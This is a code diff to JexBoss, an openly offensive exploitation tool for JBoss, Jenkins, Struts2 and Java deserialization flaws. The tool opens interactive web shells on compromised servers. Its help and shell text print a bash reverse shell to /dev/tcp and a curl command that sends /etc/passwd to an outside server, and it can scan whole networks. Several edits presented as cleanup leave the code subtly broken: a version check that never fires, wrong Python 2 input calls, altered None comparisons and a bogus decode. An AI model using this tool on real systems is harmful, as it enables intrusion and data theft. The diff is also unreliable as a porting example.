@@ -33,6 +33,7 @@ from time import sleep
 from random import randint
 import argparse, socket
 from sys import argv, exit, version_info
+
 logging.captureWarnings(True)
 FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
 logging.basicConfig(filename='jexboss_'+str(datetime.datetime.today().date())+'.log', format=FORMAT, level=logging.INFO)
@@ -51,21 +52,21 @@ ENDC = '\033[0m'
 
 def print_and_flush(message, same_line=False):
     if same_line:
-        print (message),
+        print(message),
     else:
-        print (message)
+        print(message)
     if not sys.stdout.isatty():
         sys.stdout.flush()
 
 
-if version_info[0] == 2 and version_info[1] < 7:
-    print_and_flush(RED1 + BOLD + "\n * You are using the Python version 2.6. The JexBoss requires version >= 2.7.\n"
-                        "" + GREEN + "   Please install the Python version >= 2.7. \n\n"
+if version_info[0] == 3 and version_info[1] < 0:
+    print_and_flush(RED1 + BOLD + "\n * You are using the Python version 2.7. The JexBoss requires version > 2.7.\n"
+                        "" + GREEN + "   Please install the Python version > 2.7. \n\n"
                                      "   Example for CentOS using Software Collections scl:\n"
                                      "   # yum -y install centos-release-scl\n"
                                      "   # yum -y install python27\n"
-                                     "   # scl enable python27 bash\n" + ENDC)
-    logging.CRITICAL('Python version 2.6 is not supported.')
+                                     "   # scl enable python37 bash\n" + ENDC)
+    logging.CRITICAL('Python version 2.7 is not supported.')
     exit(0)
 
 try:
@@ -137,8 +138,8 @@ def is_proxy_ok():
         r = gl_http_pool.request('GET', gl_args.host, redirect=False, headers=headers)
     except:
         print_and_flush(RED + " * Error: Failed to connect to %s using proxy %s.\n"
-                              "   See logs for more details...\n" %(gl_args.host,gl_args.proxy) + ENDC)
-        logging.warning("Failed to connect to %s using proxy" %gl_args.host, exc_info=traceback)
+                              "   See logs for more details...\n" % (gl_args.host, gl_args.proxy) + ENDC)
+        logging.warning("Failed to connect to %s using proxy" % gl_args.host, exc_info=traceback)
         return False
 
     if r.status == 407:
@@ -149,8 +150,8 @@ def is_proxy_ok():
         return False
 
     elif r.status == 503 or r.status == 502:
-        print_and_flush(RED + " * Error %s: The service %s is not availabel to your proxy. \n"
-                              "   See logs for more details...\n" %(r.status,gl_args.host)+ENDC)
+        print_and_flush(RED + " * Error %s: The service %s is not available to your proxy. \n"
+                              "   See logs for more details...\n" % (r.status, gl_args.host) + ENDC)
         logging.error("Service unavailable to your proxy")
         return False
     else:
@@ -170,7 +171,7 @@ def configure_http_pool():
         # when using proxy, protocol should be informed
         if (gl_args.host is not None and 'http' not in gl_args.host) or 'http' not in gl_args.proxy:
             print_and_flush(RED + " * When using proxy, you must specify the http or https protocol"
-                                  " (eg. http://%s).\n\n" %(gl_args.host if 'http' not in gl_args.host else gl_args.proxy) +ENDC)
+                                  " (eg. http://%s).\n\n" % (gl_args.host if 'http' not in gl_args.host else gl_args.proxy) + ENDC)
             logging.critical('Protocol not specified')
             exit(1)
 
@@ -181,7 +182,7 @@ def configure_http_pool():
             else:
                 gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, timeout=timeout, cert_reqs='CERT_NONE')
         except:
-            print_and_flush(RED + " * An error occurred while setting the proxy. Please see log for details..\n\n" +ENDC)
+            print_and_flush(RED + " * An error occurred while setting the proxy. Please see log for details..\n\n" + ENDC)
             logging.critical('Error while setting the proxy', exc_info=traceback)
             exit(1)
     else:
@@ -191,9 +192,10 @@ def configure_http_pool():
 def handler_interrupt(signum, frame):
     global gl_interrupted
     gl_interrupted = True
-    print_and_flush ("Interrupting execution ...")
+    print_and_flush("Interrupting execution ...")
     logging.info("Interrupting execution ...")
     exit(1)
+
 
 signal.signal(signal.SIGINT, handler_interrupt)
 
@@ -205,7 +207,7 @@ def check_connectivity(host, port):
         s.connect((str(host), int(port)))
         s.close()
     except socket.timeout:
-        logging.info("Failed to connect to %s:%s" %(host,port))
+        logging.info("Failed to connect to %s:%s" % (host, port))
         return False
     except:
         logging.info("Failed to connect to %s:%s" % (host, port))
@@ -239,31 +241,38 @@ def check_vul(url):
              "JMXInvokerServlet": "/invoker/JMXInvokerServlet",
              "admin-console": "/admin-console/",
              "Application Deserialization": "",
-             "Servlet Deserialization" : "",
+             "Servlet Deserialization": "",
              "Jenkins": "",
              "Struts2": "",
-             "JMX Tomcat" : ""}
+             "JMX Tomcat": ""}
 
     fatal_error = False
 
     for vector in paths:
         r = None
-        if gl_interrupted: break
+        if gl_interrupted:
+            break
         try:
 
             # check jmx tomcat only if specifically chosen
-            if (gl_args.jmxtomcat and vector != 'JMX Tomcat') or\
-                    (not gl_args.jmxtomcat and vector == 'JMX Tomcat'): continue
+            if (gl_args.jmxtomcat and vector != 'JMX Tomcat') or \
+                    (not gl_args.jmxtomcat and vector == 'JMX Tomcat'):
+                continue
 
-            if gl_args.app_unserialize and vector != 'Application Deserialization': continue
+            if gl_args.app_unserialize and vector != 'Application Deserialization':
+                continue
 
-            if gl_args.struts2 and vector != 'Struts2': continue
+            if gl_args.struts2 and vector != 'Struts2':
+                continue
 
-            if gl_args.servlet_unserialize and vector != 'Servlet Deserialization': continue
+            if gl_args.servlet_unserialize and vector != 'Servlet Deserialization':
+                continue
 
-            if gl_args.jboss and vector not in ('jmx-console', 'web-console', 'JMXInvokerServlet', 'admin-console'): continue
+            if gl_args.jboss and vector not in ('jmx-console', 'web-console', 'JMXInvokerServlet', 'admin-console'):
+                continue
 
-            if gl_args.jenkins and vector != 'Jenkins': continue
+            if gl_args.jenkins and vector != 'Jenkins':
+                continue
 
             if gl_args.force:
                 paths[vector] = 200
@@ -296,26 +305,27 @@ def check_vul(url):
                 else:
                     paths[vector] = 505
 
-            # chek vul for Java Unserializable in Application Parameters
+            # check vul for Java Unserializable in Application Parameters
             elif vector == 'Application Deserialization':
 
                 r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
                 if r.status in (301, 302, 303, 307, 308):
                     cookie = r.getheader('set-cookie')
-                    if cookie is not None: headers['Cookie'] = cookie
+                    if cookie is not None:
+                        headers['Cookie'] = cookie
                     r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
                 # link, obj = _exploits.get_param_value(r.data, gl_args.post_parameter)
                 obj = _exploits.get_serialized_obj_from_param(str(r.data), gl_args.post_parameter)
 
                 # if no obj serialized, check if there's a html refresh redirect and follow it
                 if obj is None:
-                    # check if theres a redirect link
+                    # check if there's a redirect link
                     link = _exploits.get_html_redirect_link(str(r.data))
 
                     # If it is a redirect link. Follow it
                     if link is not None:
                         r = gl_http_pool.request('GET', url + "/" + link, redirect=True, headers=headers)
-                        #link, obj = _exploits.get_param_value(r.data, gl_args.post_parameter)
+                        # link, obj = _exploits.get_param_value(r.data, gl_args.post_parameter)
                         obj = _exploits.get_serialized_obj_from_param(str(r.data), gl_args.post_parameter)
 
                 # if obj does yet None
@@ -325,24 +335,25 @@ def check_vul(url):
                     if len(list_params) > 0:
                         paths[vector] = 110
                         print_and_flush(RED + "  [ CHECK OTHER PARAMETERS ]" + ENDC)
-                        print_and_flush(RED + "\n * The \"%s\" parameter does not appear to be vulnerable.\n" %gl_args.post_parameter +
-                                                "   But there are other parameters that it seems to be xD!\n" +ENDC+GREEN+
-                                          BOLD+ "\n   Try these other parameters: \n" +ENDC)
+                        print_and_flush(RED + "\n * The \"%s\" parameter does not appear to be vulnerable.\n" % gl_args.post_parameter +
+                                                "   But there are other parameters that it seems to be xD!\n" + ENDC + GREEN +
+                                          BOLD + "\n   Try these other parameters: \n" + ENDC)
                         for p in list_params:
-                            print_and_flush(GREEN +  "      -H %s" %p+ ENDC)
-                        print ("")
+                            print_and_flush(GREEN + "      -H %s" % p + ENDC)
+                        print("")
                 elif obj is not None and obj == 'stateless':
                     paths[vector] = 100
                 elif obj is not None:
                     paths[vector] = 200
 
-            # chek vul for Java Unserializable in viewState
+            # check vul for Java Unserializable in viewState
             elif vector == 'Servlet Deserialization':
 
                 r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
                 if r.status in (301, 302, 303, 307, 308):
                     cookie = r.getheader('set-cookie')
-                    if cookie is not None: headers['Cookie'] = cookie
+                    if cookie is not None:
+                        headers['Cookie'] = cookie
                     r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
 
                 if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
@@ -353,7 +364,7 @@ def check_vul(url):
             elif vector == 'Struts2':
 
                 result = _exploits.exploit_struts2_jakarta_multipart(url, 'jexboss', gl_args.cookies)
-                if result is None or "Could not get command" in str(result) :
+                if result is None or "Could not get command" in str(result):
                     paths[vector] = 100
                 elif 'jexboss' in str(result) and "<html>" not in str(result).lower():
                     paths[vector] = 200
@@ -377,7 +388,7 @@ def check_vul(url):
 
             # check jboss vectors
             elif vector == "JMXInvokerServlet":
-                # user privided web-console path and checking JMXInvoker...
+                # user provided web-console path and checking JMXInvoker...
                 if "/web-console/Invoker" in url:
                     paths[vector] = 505
                 # if the user not provided the path, append the "/invoker/JMXInvokerServlet"
@@ -388,10 +399,10 @@ def check_vul(url):
                     else:
                         url_to_check = url
 
-                    r = gl_http_pool.request('HEAD', url_to_check , redirect=False, headers=headers)
+                    r = gl_http_pool.request('HEAD', url_to_check, redirect=False, headers=headers)
                     # if head method is not allowed/supported, try GET
                     if r.status in (405, 406):
-                        r = gl_http_pool.request('GET', url_to_check , redirect=False, headers=headers)
+                        r = gl_http_pool.request('GET', url_to_check, redirect=False, headers=headers)
 
                     # if web-console/Invoker or invoker/JMXInvokerServlet
                     if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
@@ -400,7 +411,7 @@ def check_vul(url):
                         paths[vector] = 505
 
             elif vector == "web-console":
-                # user privided JMXInvoker path and checking web-console...
+                # user provided JMXInvoker path and checking web-console...
                 if "/invoker/JMXInvokerServlet" in url:
                     paths[vector] = 505
                 # if the user not provided the path, append the "/web-console/..."
@@ -430,7 +441,7 @@ def check_vul(url):
                     r = gl_http_pool.request('GET', url + str(paths[vector]), redirect=False, headers=headers)
                 # check if the server respond with 200/500 for all requests
                 if r.status in (200, 500):
-                    r = gl_http_pool.request('GET', url + str(paths[vector])+ '/github.com/joaomatosf/jexboss', redirect=False,headers=headers)
+                    r = gl_http_pool.request('GET', url + str(paths[vector]) + '/github.com/joaomatosf/jexboss', redirect=False, headers=headers)
 
                     if r.status == 200:
                         r.status = 505
@@ -456,7 +467,8 @@ def check_vul(url):
             if r is not None and len(r.getheaders()) == 0:
                 print_and_flush(RED + "[ ERROR ]\n * The server %s is not an HTTP server.\n" % url + ENDC)
                 logging.error("The server %s is not an HTTP server." % url)
-                for key in paths: paths[key] = 505
+                for key in paths:
+                    paths[key] = 505
                 break
 
             if paths[vector] in (301, 302, 303, 307, 308):
@@ -465,13 +477,13 @@ def check_vul(url):
             elif paths[vector] == 200 or paths[vector] == 500:
                 if vector == "admin-console":
                     print_and_flush(RED + "  [ EXPOSED ]" + ENDC)
-                    logging.info("Server %s: EXPOSED" %url)
+                    logging.info("Server %s: EXPOSED" % url)
                 elif vector == "Jenkins":
                     print_and_flush(RED + "  [ POSSIBLE VULNERABLE ]" + ENDC)
-                    logging.info("Server %s: RUNNING JENKINS" %url)
+                    logging.info("Server %s: RUNNING JENKINS" % url)
                 elif vector == "JMX Tomcat":
                     print_and_flush(RED + "  [ MAYBE VULNERABLE ]" + ENDC)
-                    logging.info("Server %s: RUNNING JENKINS" %url)
+                    logging.info("Server %s: RUNNING JENKINS" % url)
                 else:
                     print_and_flush(RED + "  [ VULNERABLE ]" + ENDC)
                     logging.info("Server %s: VULNERABLE" % url)
@@ -526,7 +538,8 @@ def auto_exploit(url, exploit_type):
         result = _exploits.exploit_web_console_invoker(url)
         if result == 404:
             host, port = get_host_port_reverse_params()
-            if host == port == gl_args.cmd == None: return False
+            if host == port == gl_args.cmd is None:
+                return False
             result = _exploits.exploit_servlet_deserialization(url + "/web-console/Invoker", host=host, port=port,
                                                                cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget,
                                                                gadget_file=gl_args.load_gadget)
@@ -541,7 +554,8 @@ def auto_exploit(url, exploit_type):
             result = _exploits.exploit_jmx_invoker_file_repository(url, 1)
         if result == 404:
             host, port = get_host_port_reverse_params()
-            if host == port == gl_args.cmd == None: return False
+            if host == port == gl_args.cmd is None:
+                return False
             result = _exploits.exploit_servlet_deserialization(url + "/invoker/JMXInvokerServlet", host=host, port=port,
                                                                cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget,
                                                                gadget_file=gl_args.load_gadget)
@@ -553,20 +567,23 @@ def auto_exploit(url, exploit_type):
     elif exploit_type == "Jenkins":
 
         host, port = get_host_port_reverse_params()
-        if host == port == gl_args.cmd == None: return False
+        if host == port == gl_args.cmd is None:
+            return False
         result = _exploits.exploit_jenkins(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
                                                    gadget=gl_args.gadget, show_payload=gl_args.show_payload)
     elif exploit_type == "JMX Tomcat":
 
         host, port = get_host_port_reverse_params()
-        if host == port == gl_args.cmd == None: return False
+        if host == port == gl_args.cmd is None:
+            return False
         result = _exploits.exploit_jrmi(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows)
 
     elif exploit_type == "Application Deserialization":
 
         host, port = get_host_port_reverse_params()
 
-        if host == port == gl_args.cmd == gl_args.load_gadget == None: return False
+        if host == port == gl_args.cmd == gl_args.load_gadget is None:
+            return False
 
         result = _exploits.exploit_application_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
                                                                param=gl_args.post_parameter, force=gl_args.force,
@@ -577,7 +594,8 @@ def auto_exploit(url, exploit_type):
 
         host, port = get_host_port_reverse_params()
 
-        if host == port == gl_args.cmd == gl_args.load_gadget == None: return False
+        if host == port == gl_args.cmd == gl_args.load_gadget is None:
+            return False
 
         result = _exploits.exploit_servlet_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
                                                                gadget=gl_args.gadget, gadget_file=gl_args.load_gadget)
@@ -597,7 +615,7 @@ def auto_exploit(url, exploit_type):
                                        "   connection on your server or if your command was executed. \n"+ ENDC+
                                        "   Type [ENTER] to continue...\n")
                 # wait while enter is typed
-                input().lower() if version_info[0] >= 3 else raw_input().lower()
+                input().lower() if version_info[0] >= 3 else input().lower()
                 return True
             else:
                 if exploit_type == 'Struts2':
@@ -609,40 +627,40 @@ def auto_exploit(url, exploit_type):
         # if auto exploit mode, print message and continue...
         else:
             print_and_flush(GREEN + " * Successfully deployed/sended code via vector %s\n *** Run JexBoss in Standalone mode "
-                                    "to open command shell. ***" %(exploit_type) + ENDC)
+                                    "to open command shell. ***" % exploit_type + ENDC)
             return True
 
     # if not exploited, print error messagem and ask for type enter
     else:
         if exploit_type == 'admin-console':
-            print_and_flush(GREEN + "\n * You can still try to exploit deserialization vulnerabilitie in ViewState!\n" +
-                     "   Try this: python jexboss.py -u %s/admin-console/login.seam --app-unserialize\n" %url +
+            print_and_flush(GREEN + "\n * You can still try to exploit deserialization vulnerabilities in ViewState!\n" +
+                     "   Try this: python jexboss.py -u %s/admin-console/login.seam --app-unserialize\n" % url +
                      "   Type [ENTER] to continue...\n" + ENDC)
 
         else:
             print_and_flush(RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n" +
                                 "   Type [ENTER] to continue...\n" + ENDC)
-        logging.error("Could not exploit the server %s automatically. HTTP Code: %s" %(url, result))
+        logging.error("Could not exploit the server %s automatically. HTTP Code: %s" % (url, result))
         # wait while enter is typed
-        input().lower() if version_info[0] >= 3 else raw_input().lower()
+        input().lower() if version_info[0] >= 3 else input().lower()
         return False
 
 
 def ask_for_reverse_host_and_port():
     print_and_flush(GREEN + " * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.\n"
-                            "   OBS: You can also use the --cmd \"command\" to send specific commands to run on the server."+NORMAL)
+                            "   OBS: You can also use the --cmd \"command\" to send specific commands to run on the server." + NORMAL)
 
-    # If not *nix (that is, if somethine like git bash on Rwindow$)
+    # If not *nix (that is, if something like git bash on Rwindow$)
     if not sys.stdout.isatty():
         print_and_flush("   IP Address (RHOST): ", same_line=True)
-        host = input().lower() if version_info[0] >= 3 else raw_input().lower()
+        host = input().lower() if version_info[0] >= 3 else input().lower()
         print_and_flush("   Port (RPORT): ", same_line=True)
-        port = input().lower() if version_info[0] >= 3 else raw_input().lower()
+        port = input().lower() if version_info[0] >= 3 else input().lower()
     else:
-        host = input("   IP Address (RHOST): ").lower() if version_info[0] >= 3 else raw_input("   IP Address (RHOST): ").lower()
-        port = input("   Port (RPORT): ").lower() if version_info[0] >= 3 else raw_input("   Port (RPORT): ").lower()
+        host = input("   IP Address (RHOST): ").lower() if version_info[0] >= 3 else input("   IP Address (RHOST): ").lower()
+        port = input("   Port (RPORT): ").lower() if version_info[0] >= 3 else input("   Port (RPORT): ").lower()
 
-    print ("")
+    print("")
     return str(host), str(port)
 
 
@@ -655,7 +673,7 @@ def get_host_port_reverse_params():
                                           "   Use option --cmd instead of --reverse-shell...\n" + ENDC +
                                     "   Type [ENTER] to continue...\n")
             # wait while enter is typed
-            input().lower() if version_info[0] >= 3 else raw_input().lower()
+            input().lower() if version_info[0] >= 3 else input().lower()
             return None, None
 
         tokens = gl_args.reverse_host.split(":")
@@ -668,7 +686,7 @@ def get_host_port_reverse_params():
     elif gl_args.cmd is None and gl_args.load_gadget is None:
         host, port = ask_for_reverse_host_and_port()
     else:
-        # if cmd or gadget file ware privided
+        # if cmd or gadget file ware provided
         host, port = None, None
 
     return host, port
@@ -682,26 +700,26 @@ def shell_http_struts(url):
     """
     print_and_flush("# ----------------------------------------- #\n")
     print_and_flush(GREEN + BOLD + " * For a Reverse Shell (like meterpreter =]), type sometime like: \n\n"
-                    "\n" +ENDC+
+                    "\n" + ENDC +
                     "     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\n"
-                    "   \n"+GREEN+
-                    "   And so on... =]\n" +ENDC
+                    "   \n" + GREEN +
+                    "   And so on... =]\n" + ENDC
                     )
     print_and_flush("# ----------------------------------------- #\n")
 
-    resp = _exploits.exploit_struts2_jakarta_multipart(url,'whoami', gl_args.cookies)
+    resp = _exploits.exploit_struts2_jakarta_multipart(url, 'whoami', gl_args.cookies)
 
     print_and_flush(resp.replace('\\n', '\n'), same_line=True)
-    logging.info("Server %s exploited!" %url)
+    logging.info("Server %s exploited!" % url)
 
     while 1:
-        print_and_flush(BLUE + "[Type commands or \"exit\" to finish]" +ENDC)
+        print_and_flush(BLUE + "[Type commands or \"exit\" to finish]" + ENDC)
 
         if not sys.stdout.isatty():
             print_and_flush("Shell> ", same_line=True)
-            cmd = input() if version_info[0] >= 3 else raw_input()
+            cmd = input() if version_info[0] >= 3 else input()
         else:
-            cmd = input("Shell> ") if version_info[0] >= 3 else raw_input("Shell> ")
+            cmd = input("Shell> ") if version_info[0] >= 3 else input("Shell> ")
 
         if cmd == "exit":
             break
@@ -710,13 +728,14 @@ def shell_http_struts(url):
         print_and_flush(resp.replace('\\n', '\n'))
 
 
-# FIX: capture the readtimeout   File "jexboss.py", line 333, in shell_http
+# FIX: capture the read timeout   File "jexboss.py", line 333, in shell_http
 def shell_http(url, shell_type):
     """
     Connect to an HTTP shell
     :param url: The URL to connect to
     :param shell_type: The type of shell to connect to
     """
+    path = ""
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
                "User-Agent": get_random_user_agent()}
@@ -729,7 +748,7 @@ def shell_http(url, shell_type):
     elif shell_type == "JMXInvokerServlet":
         path = '/jexinv4/jexinv4.jsp?'
 
-    gl_http_pool.request('GET', url+path, redirect=False, headers=headers)
+    gl_http_pool.request('GET', url + path, redirect=False, headers=headers)
 
     sleep(7)
     resp = ""
@@ -738,13 +757,13 @@ def shell_http(url, shell_type):
     print_and_flush("# ----------------------------------------- #\n")
     print_and_flush(GREEN + BOLD + " * For a Reverse Shell (like meterpreter =]), type the command: \n\n"
                                    "   jexremote=YOUR_IP:YOUR_PORT\n\n" + ENDC + GREEN +
-                    "   Example:\n" +ENDC+
+                    "   Example:\n" + ENDC +
                     "     Shell>jexremote=192.168.0.10:4444\n"
-                    "\n" +GREEN+
-                    "   Or use other techniques of your choice, like:\n" +ENDC+
+                    "\n" + GREEN +
+                    "   Or use other techniques of your choice, like:\n" + ENDC +
                     "     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\n"
-                    "   \n"+GREEN+
-                    "   And so on... =]\n" +ENDC
+                    "   \n" + GREEN +
+                    "   And so on... =]\n" + ENDC
                     )
     print_and_flush("# ----------------------------------------- #\n")
 
@@ -754,21 +773,21 @@ def shell_http(url, shell_type):
             r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
             resp += " " + str(r.data).split(">")[1]
         except:
-            print_and_flush(RED + " * Apparently an IPS is blocking some requests. Check for updates will be disabled...\n\n"+ENDC)
+            print_and_flush(RED + " * Apparently an IPS is blocking some requests. Check for updates will be disabled...\n\n" + ENDC)
             logging.warning("Disabling checking for updates.", exc_info=traceback)
             headers['no-check-updates'] = 'true'
 
     print_and_flush(resp.replace('\\n', '\n'), same_line=True)
-    logging.info("Server %s exploited!" %url)
+    logging.info("Server %s exploited!" % url)
 
     while 1:
-        print_and_flush(BLUE + "[Type commands or \"exit\" to finish]" +ENDC)
+        print_and_flush(BLUE + "[Type commands or \"exit\" to finish]" + ENDC)
 
         if not sys.stdout.isatty():
             print_and_flush("Shell> ", same_line=True)
-            cmd = input() if version_info[0] >= 3 else raw_input()
+            cmd = input() if version_info[0] >= 3 else input()
         else:
-            cmd = input("Shell> ") if version_info[0] >= 3 else raw_input("Shell> ")
+            cmd = input("Shell> ") if version_info[0] >= 3 else input("Shell> ")
 
         if cmd == "exit":
             break
@@ -811,7 +830,7 @@ def banner():
     Print the banner
     """
     clear()
-    print_and_flush(RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
+    print_and_flush(RED1 + "\n * --- JexBoss: Jboss verify and Exploitation Tool  --- *\n"
                  " |  * And others Java Deserialization Vulnerabilities * | \n"
                  " |                                                      |\n"
                  " | @author:  João Filho Matos Figueiredo                |\n"
@@ -820,7 +839,7 @@ def banner():
                  " | @update: https://github.com/joaomatosf/jexboss       |\n"
                  " #______________________________________________________#\n")
     print_and_flush(RED1 + " @version: %s" % __version__)
-    print_and_flush (ENDC)
+    print_and_flush(ENDC)
 
 
 def help_usage():
@@ -829,34 +848,34 @@ def help_usage():
            " want to test [-host or -u]:\n" +
     GREEN + "\n  $ python jexboss.py -u https://site.com.br" +
 
-     BLUE + "\n\n For Java Deserialization Vulnerabilities in HTTP POST parameters. \n"
-            " This will ask for an IP address and port to try to get a reverse shell:\n" +
-     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize" +
+    BLUE + "\n\n For Java Deserialization Vulnerabilities in HTTP POST parameters. \n"
+           " This will ask for an IP address and port to try to get a reverse shell:\n" +
+    GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize" +
 
-     BLUE + "\n\n For Java Deserialization Vulnerabilities in a custom HTTP parameter and \n"
-            " to send a custom command to be executed on the exploited server:\n" +
-     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize\n"
-             "    -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server'" +
+    BLUE + "\n\n For Java Deserialization Vulnerabilities in a custom HTTP parameter and \n"
+           " to send a custom command to be executed on the exploited server:\n" +
+    GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize\n"
+            "    -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server'" +
 
-     BLUE + "\n\n For Java Deserialization Vulnerabilities in a Servlet (like Invoker):\n"+
-     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize\n" +
+    BLUE + "\n\n For Java Deserialization Vulnerabilities in a Servlet (like Invoker):\n" +
+    GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize\n" +
 
-     BLUE + "\n\n To test Java Deserialization Vulnerabilities with DNS Lookup:\n" +
-     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path --gadget dns --dns test.yourdomain.com" +
+    BLUE + "\n\n To test Java Deserialization Vulnerabilities with DNS Lookup:\n" +
+    GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path --gadget dns --dns test.yourdomain.com" +
 
-     BLUE + "\n\n For Jenkins CLI Deserialization Vulnerabilitie:\n"+
-     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/jenkins --jenkins"+
+    BLUE + "\n\n For Jenkins CLI Deserialization Vulnerabilities:\n" +
+    GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/jenkins --jenkins" +
 
-     BLUE + "\n\n For Apache Struts2 Vulnerabilities (CVE-2017-5638):\n" +
-     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path.action --struts2\n" +
+    BLUE + "\n\n For Apache Struts2 Vulnerabilities (CVE-2017-5638):\n" +
+    GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path.action --struts2\n" +
 
-     BLUE + "\n\n For auto scan mode, you must provide the network in CIDR format, "
-   "\n list of ports and filename for store results:\n" +
+    BLUE + "\n\n For auto scan mode, you must provide the network in CIDR format, "
+          "\n list of ports and filename for store results:\n" +
     GREEN + "\n  $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 \n"
-            "    -results report_auto_scan.log" +
+           "    -results report_auto_scan.log" +
 
     BLUE + "\n\n For file scan mode, you must provide the filename with host list "
-           "\n to be scanned (one host per line) and filename for store results:\n" +
+          "\n to be scanned (one host per line) and filename for store results:\n" +
     GREEN + "\n  $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log\n" + ENDC)
     return usage
 
@@ -866,7 +885,8 @@ def network_args(string):
         if version_info[0] >= 3:
             value = ipaddress.ip_network(string)
         else:
-            value = ipaddress.ip_network(unicode(string))
+            # value = ipaddress.ip_network(unicode(string))
+            value = ipaddress.ip_network(string).decode("UTF-8")
     except:
         msg = "%s is not a network address in CIDR format." % string
         logging.error("%s is not a network address in CIDR format." % string)
@@ -887,18 +907,18 @@ def main():
                                           "   Do you want to update now?")
             if not sys.stdout.isatty():
                 print_and_flush("   YES/no? ", same_line=True)
-                pick = input().lower() if version_info[0] >= 3 else raw_input().lower()
+                pick = input().lower() if version_info[0] >= 3 else input().lower()
             else:
-                pick = input("   YES/no? ").lower() if version_info[0] >= 3 else raw_input("   YES/no? ").lower()
+                pick = input("   YES/no? ").lower() if version_info[0] >= 3 else input("   YES/no? ").lower()
 
             print_and_flush(ENDC)
             if pick != "no":
                 updated = _updates.auto_update()
                 if updated:
-                    print_and_flush(GREEN + BOLD + "\n * The JexBoss has been successfully updated. Please run again to enjoy the updates.\n" +ENDC)
+                    print_and_flush(GREEN + BOLD + "\n * The JexBoss has been successfully updated. Please run again to enjoy the updates.\n" + ENDC)
                     exit(0)
                 else:
-                    print_and_flush(RED + BOLD + "\n\n * An error occurred while updating the JexBoss. Please try again..\n" +ENDC)
+                    print_and_flush(RED + BOLD + "\n\n * An error occurred while updating the JexBoss. Please try again..\n" + ENDC)
                     exit(1)
 
     vulnerables = False
@@ -927,9 +947,9 @@ def main():
                           RED + "   Continue only if you have permission!" + ENDC)
                     if not sys.stdout.isatty():
                         print_and_flush("   yes/NO? ", same_line=True)
-                        pick = input().lower() if version_info[0] >= 3 else raw_input().lower()
+                        pick = input().lower() if version_info[0] >= 3 else input().lower()
                     else:
-                        pick = input("   yes/NO? ").lower() if version_info[0] >= 3 else raw_input("   yes/NO? ").lower()
+                        pick = input("   yes/NO? ").lower() if version_info[0] >= 3 else input("   yes/NO? ").lower()
 
                     if pick == "yes":
                         auto_exploit(url, vector)
@@ -939,10 +959,11 @@ def main():
         file_results = open(gl_args.results, 'w')
         file_results.write("JexBoss Scan Mode Report\n\n")
         for ip in gl_args.network.hosts():
-            if gl_interrupted: break
+            if gl_interrupted:
+                break
             for port in gl_args.ports.split(","):
                 if check_connectivity(ip, port):
-                    url = "{0}:{1}".format(ip,port)
+                    url = "{0}:{1}".format(ip, port)
                     ip_results = check_vul(url)
                     for key in ip_results.keys():
                         if ip_results[key] == 200 or ip_results[key] == 500:
@@ -958,7 +979,7 @@ def main():
 
                             file_results.flush()
                 else:
-                    print_and_flush (RED+"\n * Host %s:%s does not respond."% (ip,port)+ENDC)
+                    print_and_flush(RED + "\n * Host %s:%s does not respond." % (ip, port) + ENDC)
         file_results.close()
     # check vulnerabilities for file scan mode
     elif gl_args.mode == 'file-scan':
@@ -966,10 +987,16 @@ def main():
         file_results.write("JexBoss Scan Mode Report\n\n")
         file_input = open(gl_args.file, 'r')
         for url in file_input.readlines():
-            if gl_interrupted: break
+            if gl_interrupted:
+                break
             url = url.strip()
             ip = str(parse_url(url)[2])
-            port = parse_url(url)[3] if parse_url(url)[3] != None else 80
+
+            if parse_url(url)[3] is not None:
+                port = parse_url(url)[3]
+            else:
+                port = 80
+
             if check_connectivity(ip, port):
                 url_results = check_vul(url)
                 for key in url_results.keys():
@@ -986,21 +1013,21 @@ def main():
 
                         file_results.flush()
             else:
-                print_and_flush (RED + "\n * Host %s:%s does not respond." % (ip, port) + ENDC)
+                print_and_flush(RED + "\n * Host %s:%s does not respond." % (ip, port) + ENDC)
         file_results.close()
 
     # resume results
     if vulnerables:
         banner()
         print_and_flush(RED + BOLD+" Results: potentially compromised server!" + ENDC)
-        if gl_args.mode  == 'file-scan':
+        if gl_args.mode == 'file-scan':
